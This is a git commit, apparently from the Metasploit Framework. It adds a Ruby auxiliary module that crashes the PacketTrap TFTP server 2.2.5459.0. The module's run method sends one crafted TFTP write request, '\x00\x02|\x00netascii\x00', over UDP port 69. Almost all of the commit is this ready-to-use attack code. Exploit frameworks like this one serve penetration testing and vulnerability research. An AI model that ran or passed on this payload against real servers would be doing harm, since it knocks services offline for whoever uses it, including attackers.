3c4aec43d57cc2653f3910d113b3e93dc527d430
kris <>
2008-10-29 17:28:34 +0000

    Adding DoS aux module for the PacketTrap TFTP server
    git-svn-id: file:///home/svn/framework3/trunk@5800 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/tftp/pt360_write.rb
@@ -0,0 +1,31 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Udp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'PacketTrap TFTP Server 2.2.5459.0 DoS',
+			'Description'    => %q{
+				The PacketTrap TFTP server version 2.2.5459.0 can be
+				brought down by sending a special write request.
+			},
+			'Author'         => 'Kris Katterjohn <katterjohn@gmail.com>',
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[ [ 'URL', 'http://milw0rm.com/exploits/6863'] ],
+			'DisclosureDate' => 'Oct 29 2008'))
+
+		register_options([Opt::RPORT(69)])
+	end
+
+	def run
+		connect_udp
+		print_status("Sending write request...")
+		udp_sock.put("\x00\x02|\x00netascii\x00")
+		disconnect_udp
+	end
+end
+
